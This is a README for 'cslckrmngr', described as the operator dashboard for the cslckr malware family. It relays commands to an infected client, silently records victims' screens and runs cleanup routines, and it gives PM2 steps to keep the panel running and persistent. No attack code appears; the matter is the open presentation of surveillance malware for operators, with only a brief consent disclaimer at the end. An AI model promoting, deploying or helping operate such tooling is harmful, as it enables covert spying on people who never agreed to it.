# cslckrmngr

cslckrmngr is the administrative control interface for the cslckr malware family. It serves as the primary dashboard for operators to send commands to [cslckrwbcl client](https://github.com/raedhashmi/cslckrwbcl) through the [cslckr server](https://github.com/raedhashmi/cslckr)

## Overview

The manager facilitates high-level administration by:
*   **Centralized Monitoring:** Interfacing with the relay server to track active connections.
*   **Recording the victim:** Sends a request to the server whcih is forwarded on to cslckrwbcl which can silently record the victims computer and render it in the manager app.
*   **Global Commands:** Executing cleanup routines and state changes across the infrastructure.

## Configuration & Deployment

### Environment Setup
Ensure the following dependencies are present in your environment:
*   **Python 3.13**
*   **Flask**
*   **Requests**

### Production Process Management (PM2)
To ensure the manager remains online and restarts automatically after crashes or server reboots, it is recommended to use [PM2](https://pm2.keymetrics.io).

1.  **Start the application:**
    ```bash
    pm2 start cslckrmngr.py --name "cslckr-manager" --interpreter python3
    ```

2.  **Monitor the process:**
    ```bash
    pm2 status
    pm2 logs cslckr-manager
    ```

3.  **Persistence:**
    To ensure the manager starts on system boot:
    ```bash
    pm2 save
    ```

## Contributing

Contributions are welcome for educational improvements or feature enhancements.
1. Fork the repository.
2. Create a new feature branch.
3. Submit a pull request with a detailed description of changes.
4. For major changes, please open an issue first to discuss your ideas.

## License

This project is licensed under the [MIT License](https://opensource.org). You are free to use, modify, and distribute the software, provided the original copyright and permission notice are included.

## Disclaimer
This software is intended for educational research and private infrastructure management. It must only be deployed on systems where the operator has explicit, documented authorization.
I will not be held responsible for any damage caused by the cslckr malware if it is installed on a machines without user consent.